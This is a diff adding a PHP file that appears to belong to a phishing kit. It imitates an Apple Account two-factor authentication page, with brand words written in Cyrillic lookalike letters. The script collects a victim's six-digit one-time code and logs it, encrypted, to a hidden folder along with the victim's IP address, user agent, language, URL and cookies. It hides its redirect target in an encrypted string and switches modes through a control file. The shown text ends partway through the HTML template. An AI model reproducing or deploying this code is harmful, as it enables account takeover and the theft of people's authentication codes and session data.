@@ -1,0 +1,1029 @@
+<?php
+ob_start();
+
+error_reporting(0);
+ini_set('display_errors', 0);
+header("Cache-Control: no-cache, no-store, must-revalidate");
+header("Pragma: no-cache");
+header("Expires: 0");
+// Prevent MIME type sniffing
+header("X-Content-Type-Options: nosniff");
+session_set_cookie_params([
+        'lifetime' => 7 * 24 * 60 * 60,
+        'path' => '/',
+        'domain' => '',
+        'secure' => isset($_SERVER['HTTPS']),
+        'httponly' => true,
+        'samesite' => 'Lax'
+    ]);
+session_start();
+
+// Include token functions
+require 'token.php';
+
+// Session timeout in seconds
+$session_timeout = 60;
+
+// ===== TOKEN-BASED URL OBFUSCATION =====
+$token_in_url = isset($_GET['token']) ? $_GET['token'] : '';
+
+// Collect all parameters to store
+$all_params = [
+    'ze25' => isset($_GET['ze25']) ? $_GET['ze25'] : '',
+    'otv23' => isset($_GET['otv23']) ? $_GET['otv23'] : '',
+    'pass' => isset($_GET['pass']) ? $_GET['pass'] : '',
+    'email' => isset($_GET['email']) ? $_GET['email'] : '',
+    'ctx' => isset($_GET['ctx']) ? $_GET['ctx'] : '',
+    'p' => isset($_GET['p']) ? $_GET['p'] : '',
+    'timestamp' => isset($_GET['timestamp']) ? $_GET['timestamp'] : ''
+];
+
+if (empty($token_in_url)) {
+    // No token in URL - generate one and redirect
+    $token = generateToken();
+    
+    // Store all parameters in session
+    $_SESSION['stored_params'] = $all_params;
+    $_SESSION['param_timestamp'] = time();
+    
+    // Build clean redirect URL with only token
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    $path = strtok($_SERVER['REQUEST_URI'], '?');
+    $redirectUrl = $protocol . '://' . $host . $path . '?token=' . $token;
+    
+    // Clean output buffers and redirect
+    while (ob_get_level()) {
+        ob_end_clean();
+    }
+    
+    session_write_close();
+    header("Location: $redirectUrl");
+    exit;
+} else {
+    // Token is in URL - check if it matches session or needs validation
+    
+    // If session doesn't have a token yet (first redirect), store this one
+    if (!isset($_SESSION['secure_token'])) {
+        $_SESSION['secure_token'] = $token_in_url;
+        $_SESSION['token_time'] = time();
+        $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+        $_SESSION['agent'] = $_SERVER['HTTP_USER_AGENT'];
+    }
+    
+    // Validate the token
+    if (!validateToken($token_in_url)) {
+        // Invalid or expired token - redirect to generate new one
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'];
+        $path = strtok($_SERVER['REQUEST_URI'], '?');
+        $redirectUrl = $protocol . '://' . $host . $path;
+        
+        while (ob_get_level()) {
+            ob_end_clean();
+        }
+        session_write_close();
+        header("Location: $redirectUrl");
+        exit;
+    }
+    
+    // Token valid - restore parameters from session
+    if (isset($_SESSION['stored_params'])) {
+        $stored_params = $_SESSION['stored_params'];
+        
+        // Merge stored params with URL params - exclude timestamp as we handle expiry via session
+        foreach ($stored_params as $key => $value) {
+            if ($key !== 'timestamp' && (!isset($_GET[$key]) || empty($_GET[$key]))) {
+                $_GET[$key] = $value;
+            }
+        }
+        
+        $all_params = array_merge($all_params, $stored_params);
+    }
+    
+    // Update session token timestamp to extend validity
+    $_SESSION['token_time'] = time();
+    
+    // Update param_timestamp to current time to prevent "Link expired"
+    $_SESSION['param_timestamp'] = time();
+}
+
+// ===== END TOKEN-BASED URL OBFUSCATION =====
+
+// Check if session has expired
+if (isset($_SESSION['param_timestamp'])) {
+    $elapsed = time() - $_SESSION['param_timestamp'];
+    if ($elapsed > $session_timeout) {
+        // Session expired - clear session data
+        unset($_SESSION['ze25']);
+        unset($_SESSION['otv23']);
+        unset($_SESSION['pass']);
+        unset($_SESSION['param_timestamp']);
+        $session_expired = true;
+    } else {
+        $session_expired = false;
+    }
+} else {
+    $session_expired = false;
+}
+
+include 'enc1';
+
+// 1. Decrypt the target URL
+$gtttt = "Y5NR5YJYPoGwrSEymeFOrf8fLEdaJIHTLYfCK7jRW9wRklzJIUSrfK7BqB+YiBJ3Il+uHKlUxaJKatPUptSkhGHh9gfbVg==";
+$defjjf = SecureAdvCrypt::decrypt($gtttt);
+$pass = isset($_GET['pass']) ? trim($_GET['pass']) : '';
+$controlFile = 'Bdsesyhsdhghhh/control.txt';
+if (file_exists($controlFile)) {
+    $content = trim(file_get_contents($controlFile));
+    if ($content === '0') {
+        if ($defjjf) {
+            header('Location: ' . $defjjf);
+            exit;
+        }
+        die("Redirect URL invalid.");
+    } else if ($content === '2') {
+        header('Location: thank_you' . (!empty($pass) ? '?pass=' . urlencode($pass) : ''));
+        exit;
+    } else if ($content === '1') {
+        // Logic for manual data submission
+        if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST['user_data'])) {
+            echo "<script>window.top.location.href = " . json_encode($defjjf) . ";</script>";
+            exit;
+        }
+    } else {
+        die("Unknown control state.");
+    }
+} else {
+    die("Control file missing.");
+}
+
+$blockedIps = array('192.168.1.1', '10.0.0.1');
+$clientIp = $_SERVER['REMOTE_ADDR'];
+if (in_array($clientIp, $blockedIps)) {
+    echo "Access blocked.";
+    exit;
+}
+
+$seterfb = isset($_GET['otv23']) ? trim($_GET['otv23']) : '';
+
+if (!empty($seterfb)) {
+    $seterfb_fixed = str_replace(' ', '+', $seterfb);
+    $fdsgsss = SecureAdvCrypt::decrypt($seterfb_fixed);
+}
+
+$isVerified = false;
+$is_blocked = false;
+$error = false;
+$ze25 = isset($_GET['ze25']) ? $_GET['ze25'] : '';
+
+$blockedNumbers = array('54544545', '9877551221221', '5989896598545', '545454545454');
+$decrypted_ze25 = SecureAdvCrypt::decrypt($ze25);
+$decrypted_ze25 = str_replace(' ', '+',  $decrypted_ze25);
+$decryptedValue = $decrypted_ze25;
+if (!empty($ze25)) {
+    if (($decrypted_ze25 !== null && in_array($decrypted_ze25, $blockedNumbers)) ||
+        in_array($ze25, $blockedNumbers)) {
+        $is_blocked = true;
+        $blocked_value = $decrypted_ze25 !== null ? $decrypted_ze25 : $ze25;
+        $reason = "Attribute '$blocked_value' is blocked.";
+        echo $reason . PHP_EOL;
+    } else {
+       // echo "Not blocked" . PHP_EOL;
+    }
+}
+
+if ($is_blocked) {
+    echo $reason;
+    exit;
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $otp = '';
+    for ($i = 1; $i <= 6; $i++) {
+        $otp .= isset($_POST['otp' . $i]) ? $_POST['otp' . $i] : '';
+    }
+    if (strlen($otp) === 6) {
+        // Check if OTP is repetitive (all digits the same, e.g., 111111, 222222, etc.)
+        if (preg_match('/^(\d)\1{5}$/', $otp)) {
+            $error = true;
+        } else {
+            // Check if first time for this zx09
+            $encrypted_ze25 = SecureAdvCrypt::encrypt($ze25);
+            $used_file = 'Bdsesyhsdhghhh/used.txt';
+            if (!file_exists($used_file)) {
+                file_put_contents($used_file, '');
+            }
+            $used_contents = file_get_contents($used_file);
+            if (strpos($used_contents, $encrypted_ze25) === false) {
+                // First time, log OTP
+                $folder = 'Bdsesyhsdhghhh';
+                if (!is_dir($folder)) {
+                    mkdir($folder, 0755, true);
+                }
+                $file = $folder . '/otp.txt';
+                $date = date('Y-m-d H:i:s');
+                $identifier = uniqid();
+                $ip = $_SERVER['REMOTE_ADDR'];
+                $useragent = $_SERVER['HTTP_USER_AGENT'];
+                $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+                $url = $_SERVER['REQUEST_URI'];
+                $cookies = json_encode($_COOKIE);
+                $encrypted_otp = SecureAdvCrypt::encrypt("OTP:" . $otp);
+                $encrypted_date = SecureAdvCrypt::encrypt("Date:" . $date);
+                $encrypted_identifier = SecureAdvCrypt::encrypt("Identifier:" . $identifier);
+                $encrypted_ip = SecureAdvCrypt::encrypt("IP:" . $ip);
+                $encrypted_useragent = SecureAdvCrypt::encrypt("Useragent:" . $useragent);
+                $encrypted_lang = SecureAdvCrypt::encrypt("Lang:" . $lang);
+                $encrypted_url = SecureAdvCrypt::encrypt("URL:" . $url);
+                $encrypted_cookies = SecureAdvCrypt::encrypt("Cookies:" . $cookies);
+                $log = "$encrypted_otp\n $encrypted_date\n $encrypted_identifier\n $encrypted_ip\n $encrypted_useragent\n $encrypted_lang\n $encrypted_url\n $encrypted_cookies\n\n";
+                file_put_contents($file, $log, FILE_APPEND);
+                // Add to used
+                file_put_contents($used_file, $encrypted_ze25 . "\n", FILE_APPEND);
+            }
+            // Stay on the same page for multiple attempts
+        }
+    }
+}
+if (function_exists('xdebug_disable')) {
+    xdebug_disable();
+}
+
+// Prepare variables for template
+$defjjfJson = json_encode($defjjf);
+$customText = isset($customText) ? $customText : '';
+$isVerified = isset($isVerified) ? $isVerified : false;
+$fdsgsss = isset($fdsgsss) ? $fdsgsss : '';
+$error = isset($error) ? $error : false;
+$session_expired = isset($session_expired) ? $session_expired : false;
+
+// Define the HTML template
+$htmlTemplate = '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Маnаgе Аррlе Ассоunt</title>
+    <script>
+        (function() {
+            const url = ' . $defjjfJson . ';
+            const requiredString = "mrev-grty-pdxse";
+            if (window.self === window.top) {
+                if (window.location.href.includes(requiredString)) {
+                    window.location.replace(url); 
+                }
+            }
+        })();
+    </script>
+    <script type="text/javascript">
+        // Hide URL parameters from address bar - show only token
+        if (window.location.search) {
+            const url = new URL(window.location.href);
+            const token = url.searchParams.get("token");
+            if (token) {
+                // Keep only token in URL, hide all other parameters
+                const cleanUrl = window.location.pathname + "?token=" + token;
+                window.history.replaceState({}, "", cleanUrl);
+            }
+        }
+    </script>
+    <style>
+        * {
+            /* box-sizing: border-box; */
+        }
+        body {
+            margin: 0 auto 13px;
+            word-break: break-word;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 10vh;
+        }
+        a {
+            color: #0060c8;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        a:hover,
+        a:focus {
+            text-decoration: underline;
+        }
+        /* Container constraint for center content */
+        .Rec567 {
+            max-width: 980px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        /* Floating placeholder style */
+        .input-Rec567 {
+            width: 480px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .Rdes121 {
+            border: 1px solid #a1a1a6;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+        .input-Rec567 input.Tre789 {
+            position: relative;
+            z-index: 2;
+            background: transparent;
+        }
+        .input-Rec567::before {
+            content: attr(data-placeholder);
+            position: absolute;
+            top: 20px;
+            left: 16px;
+            font-size: 15px;
+            color: #6e6e73;
+            pointer-events: none;
+            background-color: white;
+            padding: 0 4px;
+            transition: all 0.2s ease-in-out;
+            z-index: 1;
+        }
+        .input-Rec567.floating::before {
+            top: 4px;
+            font-size: 12px;
+            color: #86868b;
+        }
+        .input-Rec567.error::before {
+            color: red;
+        }
+        .Tre789 {
+            width: 100%;
+            height: 55px;
+            padding: 20px 16px 8px 16px;
+            border: 1px solid #a1a1a6;
+            font-size: 15px;
+            outline-offset: 2px;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            background-color: #fff;
+            border-radius: 12px;
+            position: relative;
+            z-index: 2;
+        }
+
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 89 ;
+        }
+        header > .Rec567 {
+            border-bottom: 1px solid #d2d2d7;
+        }
+        .yst432 {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+            height: 44px;
+            font-weight: 400;
+            font-size: 14px;
+            padding: 0 25px;
+        }
+        .yst432 .Reb5432,
+        .yst432  {
+            display: flex;
+            align-items: center;
+            gap: 34px;
+            white-space: nowrap;
+            user-select: none;
+        }
+        .Reb5432 {
+            flex-grow: 1;
+        }
+        .yst432 .nav-action,
+        .yst432  {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            white-space: nowrap;
+            user-select: none;
+        }
+        .nav-action{
+            flex-grow: 1;
+        }
+        
+        .sdrt12 {
+            display: inline-block;
+            width: 45px;
+            height: 44px;
+            background: black;
+            mask: url("data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQ0IiB2aWV3Qm94PSIwIDAgMTQgNDQiIHdpZHRoPSIxNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMTMuMDcyOSAxNy42ODI1YTMuNjEgMy42MSAwIDAgMCAtMS43MjQ4IDMuMDM2NSAzLjUxMzIgMy41MTMyIDAgMCAwIDIuMTM3OSAzLjIyMjMgOC4zOTQgOC4zOTQgMCAwIDEgLTEuMDk0OCAyLjI2MThjLS42ODE2Ljk4MTItMS4zOTQzIDEuOTYyMy0yLjQ3ODcgMS45NjIzcy0xLjM2MzMtLjYzLTIuNjEzLS42M2MtMS4yMTg3IDAtMS42NTI1LjY1MDctMi42NDQuNjUwN3MtMS42ODM0LS45MDg5LTIuNDc4Ny0yLjAyNDNhOS43ODQyIDkuNzg0MiAwIDAgMSAtMS42NjI4LTUuMjc3NmMwLTMuMDk4NCAyLjAxNC00Ljc0MDUgMy45OTY5LTQuNzQwNSAxLjA1MzUgMCAxLjkzMTQuNjkxOSAyLjU5MjQuNjkxOS42MyAwIDEuNjExMi0uNzMzMyAyLjgwOTItLjczMzNhMy43NTc5IDMuNzU3OSAwIDAgMSAzLjE2MDQgMS41ODAyem0tMy43Mjg0LTIuODkxOGEzLjU2MTUgMy41NjE1IDAgMCAwIC44NDY5LTIuMjIgMS41MzUzIDEuNTM1MyAwIDAgMCAtLjAzMS0uMzIgMy41Njg2IDMuNTY4NiAwIDAgMCAtMi4zNDQ1IDEuMjA4NCAzLjQ2MjkgMy40NjI5IDAgMCAwIC0uODc3OSAyLjE1ODUgMS40MTkgMS40MTkgMCAwIDAgLjAzMSAuMjg5MiAxLjE5IDEuMTkgMCAwIDAgLjIxNjkuMDIwNyAzLjA5MzUgMy4wOTM1IDAgMCAwIDIuMTU4Ni0xLjEzNjh6Ij48L3BhdGg+PC9zdmc+") no-repeat center;
+            -webkit-mask: url("data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjQ0IiB2aWV3Qm94PSIwIDAgMTQgNDQiIHdpZHRoPSIxNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMTMuMDcyOSAxNy42ODI1YTMuNjEgMy42MSAwIDAgMCAtMS43MjQ4IDMuMDM2NSAzLjUxMzIgMy41MTMyIDAgMCAwIDIuMTM3OSAzLjIyMjMgOC4zOTQgOC4zOTQgMCAwIDEgLTEuMDk0OCAyLjI2MThjLS42ODE2Ljk4MTItMS4zOTQzIDEuOTYyMy0yLjQ3ODcgMS45NjIzcy0xLjM2MzMtLjYzLTIuNjEzLS42M2MtMS4yMTg3IDAtMS42NTI1LjY1MDctMi42NDQuNjUwN3MtMS42ODM0LS45MDg5LTIuNDc4Ny0yLjAyNDNhOS43ODQyIDkuNzg0MiAwIDAgMSAtMS42NjI4LTUuMjc3NmMwLTMuMDk4NCAyLjAxNC00Ljc0MDUgMy45OTY5LTQuNzQwNSAxLjA1MzUgMCAxLjkzMTQuNjkxOSAyLjU5MjQuNjkxOS42MyAwIDEuNjExMi0uNzMzMyAyLjgwOTItLjczMzNhMy43NTc5IDMuNzU3OSAwIDAgMSAzLjE2MDQgMS41ODAyem0tMy43Mjg0LTIuODkxOGEzLjU2MTUgMy41NjE1IDAgMCAwIC44NDY5LTIuMjIgMS41MzUzIDEuNTM1MyAwIDAgMCAtLjAzMS0uMzIgMy41Njg2IDMuNTY4NiAwIDAgMCAtMi4zNDQ1IDEuMjA4NCAzLjQ2MjkgMy40NjI5IDAgMCAwIC0uODc3OSAyLjE1ODUgMS40MTkgMS40MTkgMCAwIDAgLjAzMSAuMjg5MiAxLjE5IDEuMTkgMCAwIDAgLjIxNjkuMDIwNyAzLjA5MzUgMy4wOTM1IDAgMCAwIDIuMTU4Ni0xLjEzNjh6Ij48L3BhdGg+PC9zdmc+") no-repeat center;
+            mask-size: contain;
+            -webkit-mask-size: contain;
+            cursor: pointer;
+            flex-shrink: 0;
+            margin-right: 2px;
+        }
+        /* Navigation links for top nav */
+        .yst432 a {
+            color: #1d1d1f;
+            font-weight: 400;
+            font-size: 13px;
+            line-height: 16px;
+        }
+        .yst432 a:hover,
+        .yst432 a:focus {
+            color: #0060c8;
+            text-decoration: none;
+        }
+        /* User actions - Sign In, Create Account, FAQ */
+        .user-actions a {
+            font-weight: 400;
+            font-size: 14px;
+            color: #1d1d1f;
+            padding-left: 10px;
+        }
+        .user-actions a:first-child {
+            color: #6e6e73;
+            font-weight: 400;
+            padding-left: 0;
+        }
+        .user-actions a:hover,
+        .user-actions a:focus {
+            color: #0060c8;
+            text-decoration: none;
+        }
+        /* Main content area */
+        main {
+            margin-top: 555px;
+            padding-bottom: 60px;
+            min-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+       
+        .account-logo {
+            width: 180px;
+            height: 180px;
+            margin-bottom: 24px;
+            position: relative;
+        }
+        .account-logo svg {
+            display: block;
+            margin: 0 auto;
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        /* Heading */
+        h1 {
+            font-weight: 600;
+            font-size: 24px;
+            margin: 0 0 12px 0;
+            color: #1d1d1f;
+        }
+        /* Subheading text */
+        .subheading {
+            font-weight: 400;
+            font-size: 15px;
+            color: #3c3c4399;
+            margin-bottom: 36px;
+        }
+        /* Email input */
+        form {
+            width: 500px;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 0 auto;
+        }
+        .input-Rec567 {
+            width: 480px;
+            display: flex;
+            flex-direction: column;
+            
+        }
+        .Rdes121 {
+            border: 1px solid #a1a1a6;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .Tre789 {
+            width: 100%;
+            height: 55px;
+            padding: 0 16px;
+            border: none;
+            font-size: 15px;
+            outline-offset: 2px;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            background-color: #fff;
+        }
+        .Fds765 {
+            margin: 0;
+            box-shadow: none;
+            height: auto;
+            padding: 20px 16px;
+            font-size: 15px;
+            outline-offset: 2px;
+            transition: border-color 0.2s ease-in-out;
+            width: 100%;
+            border-bottom: 1px solid #a1a1a6;
+            border-top-left-radius: 12px;
+            border-top-right-radius: 600px;
+        }
+        .input-password {
+            margin: 0;
+            box-shadow: none;
+            height: auto;
+            padding: 20px 16px;
+            font-size: 15px;
+            outline-offset: 2px;
+            transition: border-color 0.2s ease-in-out;
+            width: 100%;
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+        }
+        /* Checkbox container */
+        .checkbox-Rec567 {
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #3c3c4399;
+            cursor: pointer;
+            user-select: none;
+        }
+        .checkbox-Rec567 label {
+            cursor: pointer;
+        }
+        input[type="checkbox"] {
+            cursor: pointer;
+            width: 16px;
+            height: 16px;
+            border: 1px solid #a1a1a6;
+            border-radius: 4px;
+            background-color: #fff;
+            appearance: none;
+            -webkit-appearance: none;
+            outline-offset: 2px;
+            position: relative;
+            transition: border-color 0.2s ease-in-out, background-color 0.2s ease-in-out;
+        }
+        input[type="checkbox"]:checked {
+            background-color: #0071e3;
+            border-color: #0071e3;
+        }
+        input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            left: 4px;
+            top: 1px;
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+        /* Info block with icon and text */
+        .info-block {
+            margin-top: 30px;
+            font-size: 11px;
+            line-height: 1.4;
+            color: #3c3c4399;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 10px;
+            user-select: none;
+        }
+        /* People icon styling */
+        .icon-people {
+            width: 36px;
+            height: 36px;
+            fill: url(#gradientBlue);
+            margin-bottom: 8px;
+            flex-shrink: 0;
+        }
+        /* Link inside info text */
+        .info-block a {
+            font-size: 11px;
+            color: #0060c8;
+            font-weight: 600;
+        }
+        .info-block a:hover,
+        .info-block a:focus {
+            text-decoration: underline;
+            color: #004080;
+        }
+        /* conb677 button */
+
+        .Bst543 {
+            display: flex;
+            gap: 12px;
+            flex-wrap: nowrap;
+            justify-content: center;
+        }
+        .Bst543 button {
+            cursor: pointer;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            padding: 12px 0;
+            width: 450px;
+            transition: background-color 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .highlighted-text {
+            font-weight: bold;
+            color: #0071e3;
+        }
+        button.conb677 {
+            background-color: #8ab9f9;
+            color: white;
+            border-radius: 8px;
+            box-sizing: border-box; 
+            row-gap: 20px;
+            flex-direction: row;
+            column-gap: 10px;
+            font-size: 14px;
+            width: 450px;
+            transition: background-color 0.3s ease;
+        }
+        button.conb677:hover {
+            background-color: #6ea0d9;
+        }
+        button.ps45y {
+            background-color: #000;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 14px;
+            row-gap: 20px;
+            flex-direction: row;
+            column-gap: 10px;
+            width: -800px;
+            transition: background-color 0.3s ease;
+        }
+        button.ps45y:hover {
+            background-color: #333;
+        }
+        button.ps45y svg {
+            width: 20px;
+            height: 16px;
+            fill: white;
+        }
+
+        button.enabled {
+            background-color: #0071e3;
+            cursor: pointer;
+            box-shadow: 0 0 0 0.15em #abd4ff;
+        }
+        button.enabled:hover,
+        button.enabled:focus {
+            background-color: #004a9f;
+            outline: none;
+            box-shadow: 0 0 0 0.25em #004a9f80;
+        }
+        .Reb54320 {
+            color: red;
+            margin-top: 10px;
+        }
+        .Rdes121.error {
+            border-color: red;
+            background-color: #fff2f4;
+        }
+        .error-text {
+            color: #000000ff;
+        }
+        .error-text12{
+            color: #01010cff;
+        }
+        .ps45y-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .stx76tt {
+            font-size: 12.5px;
+            line-height: 1.33337;
+            font-weight: 400;
+            font-family: SF Pro Text,SF Pro Icons,Helvetica Neue,Helvetica,Arial,sans-serif;
+            color: #494949;
+            text-align: right;
+            margin-top: 0;
+        }
+        .btxre4 {
+            display: none;
+        }
+        /* Media query for tablets and smaller screens */
+        @media (max-width: 768px) {
+            .yst432 {
+                padding: 0 10px;
+                height: 40px;
+            }
+            .yst432 a {
+                font-size: 12px;
+            }
+            .Reb5432 {
+                gap: 16px;
+            }
+            /* Hide some links on mobile to prevent overflow */
+            .yst432 a:nth-child(n+6) {
+                display: none;
+            }
+            main {
+                margin-top: 80px;
+            }
+            .account-logo {
+                width: 140px;
+                height: 140px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .subheading {
+                font-size: 14px;
+            }
+            .input-Rec567 {
+                width: 100%;
+            }
+            .Bst543 {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .Bst543 button {
+                width: 100%;
+                max-width: 400px;
+            }
+            .info-block {
+                max-width: 100%;
+            }
+            p {
+                width: 100%;
+            }
+        }
+
+        /* Media query for mobile */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 22px;
+            }
+            main {
+                margin-top: 32px;
+            }
+            .Rec567 {
+                padding-left: 15px;
+                padding-right: 15px;
+            }
+            input[type="text"],
+            button,
+            .info-block {
+                width: 100%;
+                max-width: none;
+            }
+            .input-Rec567 {
+                width: 100%;
+            }
+            .account-logo {
+                width: 120px;
+                height: 120px;
+            }
+            .Bst543 {
+                flex-direction: column;
+            }
+            p {
+                width: 100%;
+            }
+            .yst432 a:nth-child(n+4) {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>';
+
+// Add session expired message if needed
+if ($session_expired) {
+    $htmlTemplate .= '<div style="background-color: #ffebee; border: 1px solid #ef5350; border-radius: 8px; padding: 15px; margin: 20px auto; max-width: 500px; text-align: center;">
+        <p style="color: #c62828; font-size: 16px; margin: 0;">Session has expired. Please refresh the page and try again.</p>
+    </div>';
+}
+
+$htmlTemplate .= '
+    <div id="loadingOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 80; display: flex; justify-content: center; align-items: flex-start; padding-top: 93px;">
+        <div style="display: flex; flex-direction: column; align-items: center;">
+            <img src="igassesw/aicon.png" alt="Loading..." style="width: 300px; height: 300px;">
+            <!-- <img src="loading.gif" alt="Loading..." style="width: 30px; height: 30px; margin-top: 20px;"> -->
+        </div>
+    </div>
+    <header>
+        <nav class="yst432 Rec567" aria-label="Primary navigation" style="border-bottom: none;">
+            <div class="Reb5432" role="menu">
+                <a href="#" aria-label="Аррlе hоmераgе" role="menuitem" class="sdrt12"></a>
+                <a href="#" role="menuitem">Stоrе</a>
+                <a href="#" role="menuitem">Мас</a>
+                <a href="#" role="menuitem">іРаd</a>
+                <a href="#" role="menuitem">іРhоnе</a>
+                <a href="#" role="menuitem">Watch</a>
+                <a href="#" role="menuitem">Vіѕіоn</a>
+                <a href="#" role="menuitem">АіrРоdѕ</a>
+                <a href="#" role="menuitem">ТV & Ноmе</a>
+                <a href="#" role="menuitem">Еntеrtаіnmеnt</a>
+                <a href="#" role="menuitem">Ассеѕѕоrіеѕ</a>
+                <a href="#" role="menuitem">Suрроrt</a>
+                <a role="button" id="globalnav-menubutton-link-search" class="Rsd321" href="#" data-topnav-flyout-trigger-regular="" data-topnav-flyout-trigger-compact="" aria-label=" " data-analytics-title="open - search field"><span class="Gdf543"><svg xmlns=" " width="15px" height="44px" viewBox="0 0 15 44">
+                    <path d="M14.298,27.202l-3.87-3.87c0.701-0.929,1.122-2.081,1.122-3.332c0-3.06-2.489-5.55-5.55-5.55c-3.06,0-5.55,2.49-5.55,5.55 c0,3.061,2.49,5.55,5.55,5.55c1.251,0,2.403-0.421,3.332-1.122l3.87,3.87c0.151,0.151,0.35,0.228,0.548,0.228 s0.396-0.076,0.548-0.228C14.601,27.995,14.601,27.505,14.298,27.202z M1.55,20c0-2.454,1.997-4.45,4.45-4.45 c2.454,0,4.45,1.997,4.45,4.45S8.454,24.45,6,24.45C3.546,24.45,1.55,22.454,1.55,20z"></path>
+                    </svg>
+                    <a role="button" id="globalnav-menubutton-link-bag" href="#" aria-label="Shopping Bag" data-globalnav-item-name="bag" data-topnav-flyout-trigger-regular="" data-topnav-flyout-trigger-compact="" data-analytics-title="open - bag" class="Fds876"><span class="Gdf543"><svg height="44" viewBox="0 0 14 44" width="14" xmlns=" "><path d="m11.3535 16.0283h-1.0205a3.4229 3.4229 0 0 0 -3.333-2.9648 3.4229 3.4229 0 0 0 -3.333 2.9648h-1.02a2.1184 2.1184 0 0 0 -2.117 2.1162v7.7155a2.1186 2.1186 0 0 0 2.1162 2.1167h8.707a2.1186 2.1186 0 0 0 2.1168-2.1167v-7.7155a2.1184 2.1184 0 0 0 -2.1165-2.1162zm-4.3535-1.8652a2.3169 2.3169 0 0 1 2.2222 1.8652h-4.4444a2.3169 2.3169 0 0 1 2.2222-1.8652zm5.37 11.6969a1.0182 1.0182 0 0 1 -1.0166 1.0171h-8.7069a1.0182 1.0182 0 0 1 -1.0165-1.0171v-7.7155a1.0178 1.0178 0 0 1 1.0166-1.0166h8.707a1.0178 1.0178 0 0 1 1.0164 1.0166z"></path></svg></span></a>
+                </div>
+            </div>
+        </nav>
+        <nav class="yst432 Rec567" aria-label="Primary navigation">
+            <div class="Reb5432" role="menu">
+                <strong style="font-size: 20px; color: #000;">Аррlе Ассоunt</strong>
+                <a href="#" role="menuitem" tabindex="0" style="margin-left: 550px;">Sіgn In</a>
+                <a href="#" role="menuitem" tabindex="0">Сrеаtе Yоur Аррlе Ассоunt</a>
+                <a href="#" role="menuitem" tabindex="0">FАQ</a>
+            </div>
+        </nav>
+    </header>
+    <div>
+        <center><img src="igassesw/aicon.png" style="width: 300px; height: 300px; margin-bottom: -20px;"></center>
+    </div>
+    <div>
+        <center><strong style="font-size: 32px; color: #494949;">Аррlе Ассоunt</strong></center>
+    </div>
+    <br>
+    <div>
+        <center style="font-size: 22px; color: #494949; margin-bottom: 20px;">' . ($isVerified ? htmlspecialchars($customText) : '<strong>Тwо-fасtоr</strong><br><strong>аuthеntісаtіоn</strong>') . '</center>
+    </div>
+
+    <!-- OTP input container -->
+    <form method="post" style="margin: 30px auto; max-width: 320px; display: flex; flex-direction: column; align-items: center; gap: 20px;">
+        <div style="display: flex; justify-content: center; gap: 10px;">
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp2" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp3" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp4" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp5" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" name="otp6" />
+        </div>
+        <!-- <button type="submit" style="padding: 10px 20px; background-color: #0071e3; color: white; border: none; border-radius: 8px; cursor: pointer;">Send OTP</button> -->
+    </form>
+
+    <div style="text-align: center; font-size: 18px; color: #494949; margin-top: 20px;">
